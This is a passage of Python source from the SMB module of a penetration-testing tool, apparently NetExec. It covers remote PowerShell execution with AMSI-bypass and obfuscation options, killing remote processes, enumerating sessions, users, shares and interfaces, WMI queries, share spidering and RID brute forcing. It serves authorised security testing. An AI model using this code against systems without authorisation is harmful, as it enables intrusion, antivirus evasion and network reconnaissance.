            self.logger.debug(f"Raw Output: {output}")
            output = "\n".join([ll.rstrip() for ll in output.splitlines() if ll.strip()])
            self.logger.debug(f"Cleaned Output: {output}")

            if "This script contains malicious content" in output:
                self.logger.fail("Command execution blocked by AMSI")
                return ""

            if (self.args.execute or self.args.ps_execute):
                self.logger.success(f"Executed command via {current_method}")
                if output:
                    for line in output.split("\n"):
                        self.logger.highlight(line)
            return output
        else:
            self.logger.fail(f"Execute command failed with {current_method}")
            return ""

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, obfs=False, encode=False) -> list:
        """
        Wrapper for executing a PowerShell command on the target host. This still uses the execute() method internally, but
        creates a PowerShell command together with possible AMSI bypasses and other options.

        Args:
        ----
            payload (str): The PowerShell command to execute OR the path to a file containing PowerShell commands
            get_output (bool): Whether to get the output of the command (can be useful for AV evasion)
            methods (list): The method(s) to use for command execution
            force_ps32 (bool): Whether to force 32-bit PowerShell

        Returns:
        -------
            list: A list containing the lines of the output of the command
        """
        payload = self.args.ps_execute if not payload and self.args.ps_execute else payload
        if not payload:
            self.logger.error("No command to execute specified!")
            return []

        response = []
        obfs = obfs if obfs else self.args.obfs
        encode = encode if encode else not self.args.no_encode
        force_ps32 = force_ps32 if force_ps32 else self.args.force_ps32
        get_output = True if not self.args.no_output else get_output

        self.logger.debug(f"Starting ps_execute(): {payload=} {get_output=} {methods=} {force_ps32=} {obfs=} {encode=}")
        amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None
        self.logger.debug(f"AMSI Bypass: {amsi_bypass}")

        if os.path.isfile(payload):
            self.logger.debug(f"File payload set: {payload}")
            with open(payload) as commands:
                response = [self.execute(create_ps_command(c.strip(), force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods) for c in commands]
        else:
            response = [self.execute(create_ps_command(payload, force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output, methods)]

        self.logger.debug(f"ps_execute response: {response}")
        return response

    def get_session_list(self):
        with TSTS.TermSrvEnumeration(self.conn, self.host, self.kerberos) as lsm:
            handle = lsm.hRpcOpenEnum()
            rsessions = lsm.hRpcGetEnumResult(handle, Level=1)["ppSessionEnumResult"]
            lsm.hRpcCloseEnum(handle)
            sessions = {}
            for i in rsessions:
                sess = i["SessionInfo"]["SessionEnum_Level1"]
                state = TSTS.enum2value(TSTS.WINSTATIONSTATECLASS, sess["State"]).split("_")[-1]
                sessions[sess["SessionId"]] = {
                    "state": state,
                    "SessionName": sess["Name"],
                    "RemoteIp": "",
                    "ClientName": "",
                    "Username": "",
                    "Domain": "",
                    "Resolution": "",
                    "ClientTimeZone": ""
                }
            return sessions

    def enumerate_sessions_info(self, sessions):
        if len(sessions):
            with TSTS.TermSrvSession(self.conn, self.host, self.kerberos) as TermSrvSession:
                for SessionId in sessions:
                    sessdata = TermSrvSession.hRpcGetSessionInformationEx(SessionId)
                    sessflags = TSTS.enum2value(TSTS.SESSIONFLAGS, sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["SessionFlags"])
                    sessions[SessionId]["flags"] = sessflags
                    domain = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["DomainName"]
                    if not len(sessions[SessionId]["Domain"]) and len(domain):
                        sessions[SessionId]["Domain"] = domain
                    username = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["UserName"]
                    if not len(sessions[SessionId]["Username"]) and len(username):
                        sessions[SessionId]["Username"] = username
                    sessions[SessionId]["ConnectTime"] = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["ConnectTime"]
                    sessions[SessionId]["DisconnectTime"] = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["DisconnectTime"]
                    sessions[SessionId]["LogonTime"] = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["LogonTime"]
                    sessions[SessionId]["LastInputTime"] = sessdata["LSMSessionInfoExPtr"]["LSM_SessionInfo_Level1"]["LastInputTime"]

            try:
                with TSTS.RCMPublic(self.conn, self.host, self.kerberos) as rcm:
                    for SessionId in sessions:
                        try:
                            client = rcm.hRpcGetRemoteAddress(SessionId)
                            if not client:
                                continue
                            sessions[SessionId]["RemoteIp"] = client["pRemoteAddress"]["ipv4"]["in_addr"]
                        except Exception as e:
                            self.logger.debug(f"Error getting client address for session {SessionId}: {e}")
            except SessionError:
                self.logger.fail("RDP is probably not enabled, cannot list remote IPv4 addresses.")

    @requires_admin
    def taskkill(self):
        with TSTS.LegacyAPI(self.conn, self.host, self.kerberos) as legacy:
            handle = legacy.hRpcWinStationOpenServer()
            if self.args.taskkill.isdigit():
                pidList = [int(self.args.taskkill)]
            else:
                res = legacy.hRpcWinStationGetAllProcesses(handle)
                if not res:
                    self.logger.error("Could not get process list")
                    return

                pidList = [i["UniqueProcessId"] for i in res if i["ImageName"].lower() == self.args.taskkill.lower()]
                if not pidList:
                    self.logger.fail(f"Could not find process named {self.args.taskkill}")
                    return

            for pid in pidList:
                try:
                    if legacy.hRpcWinStationTerminateProcess(handle, pid)["ErrorCode"]:
                        self.logger.highlight(f"Terminated PID {pid} ({self.args.taskkill})")
                    else:
                        self.logger.fail(f"Failed terminating PID {pid}")
                except Exception as e:
                    self.logger.exception(f"Error terminating PID {pid}: {e}")

    @requires_admin
    def qwinsta(self):
        desktop_states = {
            "WTS_SESSIONSTATE_UNKNOWN": "",
            "WTS_SESSIONSTATE_LOCK": "Locked",
            "WTS_SESSIONSTATE_UNLOCK": "Unlocked",
        }

        sessions = self.get_session_list()
        if not sessions:
            return

        self.enumerate_sessions_info(sessions)

        # Calculate max lengths for formatting
        maxSessionNameLen = max(len(sessions[i]["SessionName"]) + 1 for i in sessions)
        maxSessionNameLen = max(maxSessionNameLen, len("SESSIONNAME") + 1)
        maxUsernameLen = max(len(sessions[i]["Username"] + sessions[i]["Domain"]) + 1 for i in sessions) + 1
        maxUsernameLen = max(maxUsernameLen, len("USERNAME") + 1)
        maxIdLen = max(len(str(i)) for i in sessions)
        maxIdLen = max(maxIdLen, len("ID") + 1)
        maxStateLen = max(len(sessions[i]["state"]) + 1 for i in sessions)
        maxStateLen = max(maxStateLen, len("STATE") + 1)

        # Create the template for formatting
        template = (f"{{SESSIONNAME: <{maxSessionNameLen}}} "
                    f"{{USERNAME: <{maxUsernameLen}}} "
                    f"{{ID: <{maxIdLen}}} "
                    "{IPv4: <16} "
                    f"{{STATE: <{maxStateLen}}} "
                    "{DSTATE: <9} "
                    "{CONNTIME: <20} "
                    "{DISCTIME: <20} ")
        header = template.format(
            SESSIONNAME="SESSIONNAME",
            USERNAME="USERNAME",
            ID="ID",
            IPv4="IPv4 Address",
            STATE="STATE",
            DSTATE="Desktop",
            CONNTIME="ConnectTime",
            DISCTIME="DisconnectTime",
        )
        header2 = template.replace(" <", "=<").format(
            SESSIONNAME="",
            USERNAME="",
            ID="",
            IPv4="",
            STATE="",
            DSTATE="",
            CONNTIME="",
            DISCTIME="",
        )
        result = [header, header2]

        # Check if we need to filter for usernames
        usernames = None
        if self.args.qwinsta:
            arg = self.args.qwinsta
            if os.path.isfile(arg):
                with open(arg) as f:
                    usernames = [line.strip().lower() for line in f if line.strip()]
            else:
                usernames = [arg.lower()]

        for i in sessions:
            username = sessions[i]["Username"]
            domain = sessions[i]["Domain"]
            user_full = f"{domain}\\{username}" if username else ""

            # If usernames are provided, filter them
            if usernames and username.lower() not in usernames:
                continue

            connectTime = sessions[i]["ConnectTime"]
            connectTime = connectTime.strftime(r"%Y/%m/%d %H:%M:%S") if connectTime.year > 1601 else "None"

            disconnectTime = sessions[i]["DisconnectTime"]
            disconnectTime = disconnectTime.strftime(r"%Y/%m/%d %H:%M:%S") if disconnectTime.year > 1601 else "None"

            row = template.format(
                SESSIONNAME=sessions[i]["SessionName"],
                USERNAME=user_full,
                ID=i,
                IPv4=sessions[i]["RemoteIp"],
                STATE=sessions[i]["state"],
                DSTATE=desktop_states[sessions[i]["flags"]],
                CONNTIME=connectTime,
                DISCTIME=disconnectTime,
            )
            result.append(row)

        if len(result) > 2:
            self.logger.success("Enumerated qwinsta sessions")
            for row in result:
                self.logger.highlight(row)

    @requires_admin
    def tasklist(self):
        # Formats a row to be printed on screen
        def format_row(procInfo):
            return template.format(
                procInfo["ImageName"],
                procInfo["UniqueProcessId"],
                procInfo["SessionId"],
                procInfo["pSid"],
                f"{procInfo['WorkingSetSize'] // 1000:,} K",
            )

        try:
            with TSTS.LegacyAPI(self.conn, self.host, self.kerberos) as legacy:
                try:
                    handle = legacy.hRpcWinStationOpenServer()
                    res = legacy.hRpcWinStationGetAllProcesses(handle)
                except Exception as e:
                    # TODO: Issue https://github.com/fortra/impacket/issues/1816
                    self.logger.debug(f"Exception while calling hRpcWinStationGetAllProcesses: {e}")
                    return
                if not res:
                    return
                self.logger.success("Enumerated processes")
                maxImageNameLen = max(len(i["ImageName"]) for i in res)
                maxSidLen = max(len(i["pSid"]) for i in res)
                template = f"{{: <{maxImageNameLen}}} {{: <8}} {{: <11}} {{: <{maxSidLen}}} {{: >12}}"
                self.logger.highlight(template.format("Image Name", "PID", "Session#", "SID", "Mem Usage"))
                self.logger.highlight(template.replace(": ", ":=").format("", "", "", "", ""))
                found_task = False

                # For each process on the remote host
                for procInfo in res:
                    # If args.tasklist is not True then a process name was supplied
                    if self.args.tasklist is not True:
                        # So we look for it and print its information if found
                        if self.args.tasklist.lower() in procInfo["ImageName"].lower():
                            found_task = True
                            self.logger.highlight(format_row(procInfo))
                    # Else, no process was supplied, we print the entire list of remote processes
                    else:
                        self.logger.highlight(format_row(procInfo))

                # If a process was suppliad to args.tasklist and it was not found, we print a fail message
                if self.args.tasklist is not True and not found_task:
                    self.logger.fail(f"Didn't find process {self.args.tasklist}")

        except SessionError:
            self.logger.fail("Cannot list remote tasks, RDP is probably disabled.")

    def reg_sessions(self):

        def output(sessions):
            if sessions:
                # Calculate max lengths for formatting
                maxSidLen = max(len(key) + 1 for key in sessions)
                maxSidLen = max(maxSidLen, len("SID") + 1)
                maxUsernameLen = max(len(str(vals["Username"]) + str(vals["Domain"])) + 1 for vals in sessions.values()) + 1
                maxUsernameLen = max(maxUsernameLen, len("USERNAME") + 1)

                # Create the template for formatting
                template = (f"{{USERNAME: <{maxUsernameLen}}} {{SID: <{maxSidLen}}}")

                # Create headers
                header = template.format(USERNAME="USERNAME", SID="SID")
                header2 = template.replace(" <", "=<").format(USERNAME="", SID="")

                # Store result
                result = [header, header2]

                for sid, vals in sessions.items():
                    username = vals["Username"]
                    domain = vals["Domain"]
                    user_full = f"{domain}\\{username}" if username else ""

                    row = template.format(USERNAME=user_full, SID=sid)
                    result.append(row)

                self.logger.success("Remote Registry enumerated sessions")
                for row in result:
                    self.logger.highlight(row)
            else:
                self.logger.info(f"No active session found for specified user(s) using the Remote Registry service on {self.hostname}.")

        # Bind to the Remote Registry Pipe
        rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\winreg", smb_connection=self.conn)
        for binding_attempts in range(2, 0, -1):
            dce = rpctransport.get_dce_rpc()
            try:
                dce.connect()
                dce.bind(rrp.MSRPC_UUID_RRP)
                break
            except SessionError as e:
                self.logger.debug(f"Could not bind to the Remote Registry on {self.hostname}: {e}")
                if binding_attempts == 1:   # Last attempt
                    self.logger.info(f"The Remote Registry service seems to be disabled on {self.hostname}.")
                    return
            # STATUS_PIPE_NOT_AVAILABLE : Waiting 1 second for the service to start (if idle and set to 'Automatic' startup type)
            sleep(1)

        # Open HKU hive
        try:
            resp = rrp.hOpenUsers(dce)
        except DCERPCException as e:
            if "rpc_s_access_denied" in str(e).lower():
                self.logger.info(f"Access denied while enumerating session using the Remote Registry on {self.hostname}.")
                return
            else:
                self.logger.fail(f"Exception connecting to RPC on {self.hostname}: {e}")
        except Exception as e:
            self.logger.fail(f"Exception connecting to RPC on {self.hostname}: {e}")

        # Enumerate HKU subkeys and recover SIDs
        sid_filter = "^S-1-.*\\d$"
        exclude_sid = ["S-1-5-18", "S-1-5-19", "S-1-5-20"]

        key_handle = resp["phKey"]
        index = 1
        sessions = {}

        while True:
            try:
                resp = rrp.hBaseRegEnumKey(dce, key_handle, index)
                sid = resp["lpNameOut"].rstrip("\0")
                if re.match(sid_filter, sid) and sid not in exclude_sid:
                    self.logger.info(f"User with SID {sid} is logged in on {self.hostname}")
                    sessions.setdefault(sid, {"Username": "", "Domain": ""})
                index += 1
            except rrp.DCERPCSessionError as e:
                if "ERROR_NO_MORE_ITEMS" in str(e):
                    self.logger.debug(f"No more items found in HKU on {self.hostname}.")
                    break
                else:
                    self.logger.fail(f"Error enumerating HKU subkeys on {self.hostname}: {e}")
                    break

        rrp.hBaseRegCloseKey(dce, key_handle)
        dce.disconnect()

        if not sessions:
            self.logger.info(f"No sessions found via the Remote Registry service on {self.hostname}.")
            return

        # Bind to the LSARPC Pipe for SID resolution
        rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\lsarpc", smb_connection=self.conn)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
            dce.bind(lsat.MSRPC_UUID_LSAT)
        except Exception as e:
            self.logger.debug(f"Failed to connect to LSARPC for SID resolution on {self.hostname}: {e}")
            output(sessions)
            return

        # Resolve SIDs with names
        policy_handle = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)["PolicyHandle"]
        try:
            resp = lsat.hLsarLookupSids(dce, policy_handle, sessions.keys(), lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        except DCERPCException as e:
            if str(e).find("STATUS_SOME_NOT_MAPPED") >= 0:
                resp = e.get_packet()
                self.logger.debug(f"Could not resolve some SIDs: {e}")
            else:
                resp = None
                self.logger.debug(f"Could not resolve SID(s): {e}")

        if resp:
            for sid, item in zip(sessions.keys(), resp["TranslatedNames"]["Names"], strict=False):
                if item["DomainIndex"] >= 0:
                    sessions[sid]["Username"] = item["Name"]
                    sessions[sid]["Domain"] = resp["ReferencedDomains"]["Domains"][item["DomainIndex"]]["Name"]

        # Filter for usernames
        if self.args.reg_sessions:
            arg = self.args.reg_sessions
            if os.path.isfile(arg):
                with open(arg) as f:
                    usernames = [line.strip().lower() for line in f if line.strip()]
            else:
                usernames = [arg.lower()]

            filtered_sessions = {}
            for sid, info in sessions.items():
                if info["Username"].lower() not in usernames:
                    continue
                else:
                    filtered_sessions[sid] = info
            output(filtered_sessions)
        else:
            output(sessions)

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        temp_file = ntpath.normpath("\\" + gen_random_string() + ".txt")
        permissions = []
        write_check = bool(not self.args.no_write_check)

        try:
            self.logger.debug(f"domain: {self.domain}")
            user_id = self.db.get_user(self.domain.upper(), self.username)[0][0]
        except IndexError as e:
            if self.kerberos or self.username == "":
                pass
            else:
                self.logger.fail(f"IndexError: {e!s}")
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(f"Error getting user: {error}")

        try:
            self.logger.debug("Attempting to list shares...")
            shares = self.conn.listShares()
            self.logger.info(f"Shares returned: {shares}")
        except SessionError as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions

        for share in shares:
            share_name = share["shi1_netname"][:-1]

            # Skip excluded shares
            if self.args.exclude_shares and share_name in self.args.exclude_shares:
                self.logger.debug(f"Skipping excluded share: {share_name}")
                continue

            share_remark = share["shi1_remark"][:-1]
            share_info = {"name": share_name, "remark": share_remark, "access": []}
            read = False
            write = False
            write_dir = False
            write_file = False
            try:
                self.conn.listPath(share_name, "*")
                read = True
                share_info["access"].append("READ")
            except SessionError as e:
                error = get_error_string(e)
                self.logger.debug(f"Error checking READ access on share {share_name}: {error}")
            except (NetBIOSError, UnicodeEncodeError) as e:
                write_check = False
                share_info["access"].append("UNKNOWN (try '--no-smbv1')")
                error = get_error_string(e)
                self.logger.debug(f"Error checking READ access on share {share_name}: {error}. This exception always caused by special character in share name with SMBv1")
                self.logger.info(f"Skipping WRITE permission check on share {share_name}")

            if write_check:
                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    write_dir = True
                    self.logger.debug(f"WRITE access with DIR creation on share: {share_name}")
                    try:
                        self.conn.deleteDirectory(share_name, temp_dir)
                    except SessionError as e:
                        error = get_error_string(e)
                        if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                            pass
                        else:
                            self.logger.debug(f"Error DELETING created temp dir {temp_dir} on share {share_name}: {error}")
                except SessionError as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error checking WRITE access with DIR creation on share {share_name}: {error}")

                try:
                    tid = self.conn.connectTree(share_name)
                    fid = self.conn.createFile(tid, temp_file, desiredAccess=FILE_SHARE_WRITE, shareMode=FILE_SHARE_DELETE)
                    self.conn.closeFile(tid, fid)
                    write_file = True
                    self.logger.debug(f"WRITE access with FILE creation on share: {share_name}")
                    try:
                        self.conn.deleteFile(share_name, temp_file)
                    except SessionError as e:
                        error = get_error_string(e)
                        if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                            pass
                        else:
                            self.logger.debug(f"Error DELETING created temp file {temp_file} on share {share_name}")
                except SessionError as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error checking WRITE access with FILE creation on share {share_name}: {error}")

                # If we either can create a file or a directory we add the write privs to the output. Agreed on in https://github.com/Pennyw0rth/NetExec/pull/404
                if write_dir or write_file:
                    write = True
                    share_info["access"].append("WRITE")

            permissions.append(share_info)

            if share_name != "IPC$":
                try:
                    # TODO: check if this already exists in DB before adding
                    self.db.add_share(self.hostname, user_id, share_name, share_remark, read, write)
                except Exception as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error adding share: {error}")

        if self.args.filter_shares:
            self.logger.display("[REMOVED] Use the --shares read,write options instead.")

        self.logger.display("Enumerated shares")
        self.logger.highlight(f"{'Share':<15} {'Permissions':<15} {'Remark'}")
        self.logger.highlight(f"{'-----':<15} {'-----------':<15} {'------'}")

        for share in permissions:
            name = share["name"]
            remark = share["remark"]
            perms = ",".join(share["access"])
            if self.args.shares and self.args.shares.lower() not in perms.lower():
                continue
            self.logger.highlight(f"{name:<15} {perms:<15} {remark}")
        return permissions

    def dir(self):
        search_path = ntpath.join(self.args.dir, "*")
        try:
            contents = self.conn.listPath(self.args.share, search_path)
        except SessionError as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating '{search_path}': {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return

        if not contents:
            return

        self.logger.highlight(f"{'Perms':<9}{'File Size':<15}{'Date':<30}{'File Path':<45}")
        self.logger.highlight(f"{'-----':<9}{'---------':<15}{'----':<30}{'---------':<45}")
        for content in contents:
            full_path = ntpath.join(self.args.dir, content.get_longname())
            self.logger.highlight(f"{'d' if content.is_directory() else 'f'}{'rw-' if content.is_readonly() > 0 else 'r--':<8}{content.get_filesize():<15}{ctime(float(content.get_mtime_epoch())):<30}{full_path:<45}")

    def interfaces(self):
        """
        Enumeratie active network interfaces via SMB
        Made by Ilya Yatsenko (@fulc2um)
        """
        try:
            self.logger.display("Starting network interface enumeration")

            tree_id = self.conn.connectTree("IPC$")

            FSCTL_QUERY_NETWORK_INTERFACE_INFO = 0x001401FC

            response = self.conn._SMBConnection.ioctl(
                tree_id,
                fileId=None,
                ctlCode=FSCTL_QUERY_NETWORK_INTERFACE_INFO,
                flags=SMB2_0_IOCTL_IS_FSCTL,
                inputBlob=b"",
                maxOutputResponse=8192
            )

            if response:
                self.logger.success("Retrieved network interface data")

                # Parse FSCTL_QUERY_NETWORK_INTERFACE_INFO response data
                if not response:
                    self.logger.fail("No data to parse")
                    return

                # Parse and group interfaces
                grouped_interfaces = {}
                offset = 0

                while offset < len(response) and offset + 152 <= len(response):
                    try:
                        # Parse NETWORK_INTERFACE_INFO structure
                        next_offset = struct.unpack("<L", response[offset:offset + 4])[0]
                        if_index = struct.unpack("<L", response[offset + 4:offset + 8])[0]
                        capabilities = struct.unpack("<L", response[offset + 8:offset + 12])[0]
                        link_speed = struct.unpack("<Q", response[offset + 16:offset + 24])[0]

                        # Socket address (SockAddr_Storage at offset+24)
                        family = struct.unpack("<H", response[offset + 24:offset + 26])[0]

                        if family == 0x0002:  # IPv4
                            ip_bytes = response[offset + 28:offset + 32]
                            ip_addr = ipaddress.IPv4Address(ip_bytes)
                            addr_info = f"IPv4: {ip_addr}"
                        elif family == 0x0017:  # IPv6
                            ip6_bytes = response[offset + 32:offset + 48]
                            ip_addr = ipaddress.IPv6Address(ip6_bytes)
                            addr_info = f"IPv6: {ip_addr}"
                        else:
                            addr_info = f"Unknown family: 0x{family:04x}"

                        # Group by interface index
                        if if_index not in grouped_interfaces:
                            caps = []
                            if capabilities & 0x01:
                                caps.append("RSS")
                            if capabilities & 0x02:
                                caps.append("RDMA")

                            grouped_interfaces[if_index] = {
                                "capabilities": caps,
                                "link_speed": link_speed,
                                "addresses": []
                            }

                        grouped_interfaces[if_index]["addresses"].append(addr_info)

                        if next_offset == 0:
                            break

                        offset = next_offset if next_offset > offset else offset + next_offset
                        if offset >= len(response):
                            break

                    except (struct.error, IndexError) as e:
                        self.logger.fail(f"Error parsing interface at offset {offset}: {e}")
                        break

                # Display interfaces
                if not grouped_interfaces:
                    self.logger.fail("No network interfaces found")
                    return

                self.logger.highlight(f"Found {len(grouped_interfaces)} network interface(s)")

                for i, if_index in enumerate(sorted(grouped_interfaces.keys())):
                    iface = grouped_interfaces[if_index]
                    caps_str = ", ".join(iface["capabilities"]) if iface["capabilities"] else "None"
                    speed_mbps = iface["link_speed"] / 1000000

                    self.logger.display(f"Interface {i + 1} (Index: {if_index}):")
                    self.logger.display(f"  - Capabilities: {caps_str}")
                    self.logger.display(f"  - Speed: {speed_mbps:.0f} Mbps")
                    self.logger.display("  - Addresses:")

                    for addr in iface["addresses"]:
                        prefix = "      -"
                        self.logger.display(f"{prefix} {addr}")
            else:
                self.logger.fail("No response data received")

            self.conn.disconnectTree(tree_id)

        except Exception as e:
            self.logger.fail(f"Error during network interface enumeration: {e}")
            self.logger.fail(f"Full error: {e}", exc_info=True)

    def get_dc_ips(self):
        dc_ips = [dc[1] for dc in self.db.get_domain_controllers(domain=self.domain)]
        if not dc_ips:
            dc_ips.append(self.host)
        return dc_ips

    def smb_sessions(self):
        self.logger.fail("[REMOVED] Use option --reg-sessions --qwinsta or --loggedon-users")
        return

    def disks(self):
        try:
            rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\srvsvc", smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)

            response = srvs.hNetrServerDiskEnum(dce, 0)
            # Process the response
            self.logger.display("Enumerated disks:")
            for disk in response["DiskInfoStruct"]["Buffer"]:
                if disk["Disk"] != "\x00":
                    self.logger.highlight(disk["Disk"])
        except Exception as e:
            self.logger.fail(f"Failed to enumerate disks: {e}")

    def local_groups(self):
        self.logger.display("Enumerating with SAMRPC protocol")
        try:
            groups, members = SamrFunc(self).get_local_groups(self.args.local_groups)
        except DCERPCException as e:
            self.logger.fail(f"Error enumerating local groups: {e}")
            return

        if groups and not self.args.local_groups:
            self.logger.success("Enumerated local groups")
            self.logger.debug(f"Local groups: {groups}")

            for group_name, group_rid in groups.items():
                self.logger.highlight(f"{group_rid} - {group_name}")
                group_id = self.db.add_group(self.hostname, group_name, rid=group_rid)[0]
                self.logger.debug(f"Added group, returned id: {group_id}")
        elif groups and members:
            self.logger.success(f"Enumerated users of local groups: {groups.popitem()[0]}")

            members = dict(sorted(members.items(), key=lambda item: int(item[0].split("-")[-1])))
            for member in members:
                self.logger.highlight(f"{member} - {members[member]}")

    def groups(self):
        self.logger.fail("[REMOVED] Arg moved to the ldap protocol")
        return

    def users(self):
        if self.args.users:
            self.logger.debug(f"Dumping users: {', '.join(self.args.users)}")
        return UserSamrDump(self).dump(requested_users=self.args.users, dump_path=self.args.users_export)

    def users_export(self):
        self.users()

    def computers(self):
        self.logger.fail("[REMOVED] Arg moved to the ldap protocol")
        return

    def loggedon_users(self):
        if self.args.loggedon_users_filter:
            self.logger.fail("[REMOVED] Use option '--loggedon-users <USERNAME>' for filtering")

        logged_on = set()
        try:
            rpctransport = transport.SMBTransport(self.conn.getRemoteName(), self.conn.getRemoteHost(), filename=r"\wkssvc", smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)

            response = wkst.hNetrWkstaUserEnum(dce, 1)
            for user in response["UserInfo"]["WkstaUserInfo"]["Level1"]["Buffer"]:
                user_info = (user["wkui1_logon_domain"][:-1], user["wkui1_username"][:-1], user["wkui1_logon_server"][:-1])
                if user_info not in logged_on:
                    logged_on.add(user_info)
                    if self.args.loggedon_users:
                        if re.match(self.args.loggedon_users, user_info[1]):
                            self.logger.highlight(f"{user_info[0]}\\{user_info[1]:<25} logon_server: {user_info[2]}")
                    else:
                        self.logger.highlight(f"{user_info[0]}\\{user_info[1]:<25} logon_server: {user_info[2]}")
        except Exception as e:
            self.logger.fail(f"Error enumerating logged on users: {e}")

    def pass_pol(self):
        return PassPolDump(self).dump()

    @requires_admin
    def wmi_query(self, wql=None, namespace=None, callback_func=None):
        records = []
        if not wql:
            wql = self.args.wmi_query.strip("\n")

        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            dcom = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            flag, stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.dcom_timeout)
            if not flag or not stringBinding:
                error_msg = f"WMI Query: Dcom initialization failed on connection with stringbinding: '{stringBinding}', please increase the timeout with the option '--dcom-timeout'. If it's still failing maybe something is blocking the RPC connection, try another exec method"

                if not stringBinding:
                    error_msg = "WMI Query: Dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"

                self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
                # Make it force break function
                dcom.disconnect()
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            iEnumWbemClassObject = iWbemServices.ExecQuery(wql)
        except Exception as e:
            self.logger.fail(f"Execute WQL error: {e}")
            if "iWbemLevel1Login" in locals():
                dcom.disconnect()
        else:
            self.logger.info(f"Executing WQL syntax: {wql}")
            try:
                if not callback_func:
                    while True:
                        wmi_results = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                        record = wmi_results.getProperties()
                        records.append(record)
                        for k, v in record.items():
                            if k != "TimeGenerated":  # from the wcc module, but this is a small hack to get it to stop spamming - TODO: add in method to disable output for this function
                                self.logger.highlight(f"{k} => {v['value']}")
                else:
                    callback_func(iEnumWbemClassObject, records)
            except Exception as e:
                if str(e).find("S_FALSE") < 0:
                    self.logger.debug(e)
            dcom.disconnect()
        return records

    def spider(
        self,
        share=None,
        folder=".",
        pattern=None,
        regex=None,
        exclude_dirs=None,
        depth=None,
        content=False,
        only_files=True,
        silent=True
    ):
        if exclude_dirs is None:
            exclude_dirs = []
        if regex is None:
            regex = []
        if pattern is None:
            pattern = []
        spider = SMBSpider(self.conn, self.logger)
        if not silent:
            self.logger.display("Started spidering")
        start_time = time()
        if not share:
            spider.spider(
                self.args.spider,
                self.args.spider_folder,
                self.args.pattern,
                self.args.regex,
                self.args.exclude_dirs,
                self.args.depth,
                self.args.content,
                self.args.only_files,
                self.args.silent
            )
        else:
            spider.spider(share, folder, pattern, regex, exclude_dirs, depth, content, only_files, silent)
        if not silent:
            self.logger.display(f"Done spidering (Completed in {time() - start_time})")

        return spider.results

    def rid_brute(self, max_rid=None):
        entries = []
        if not max_rid:
            max_rid = int(self.args.rid_brute)

        KNOWN_PROTOCOLS = {
            135: {"bindstr": rf"ncacn_ip_tcp:{self.remoteName}"},
            139: {"bindstr": rf"ncacn_np:{self.remoteName}[\pipe\lsarpc]"},
            445: {"bindstr": rf"ncacn_np:{self.remoteName}[\pipe\lsarpc]"},
        }

        try:
            string_binding = KNOWN_PROTOCOLS[self.port]["bindstr"]
            self.logger.debug(f"StringBinding {string_binding}")
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(self.remoteName)

            if hasattr(rpc_transport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey)

            if self.kerberos:
                rpc_transport.set_kerberos(self.kerberos, self.kdcHost)

            dce = rpc_transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

            dce.connect()
        except Exception as e:
            self.logger.fail(f"Error creating DCERPC connection: {e}")
            return entries

        # Want encryption? Uncomment next line
        # But make simultaneous variable <= 100

        # Want fragmentation? Uncomment next line

        dce.bind(lsat.MSRPC_UUID_LSAT)
        try:
            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        except lsad.DCERPCSessionError as e:
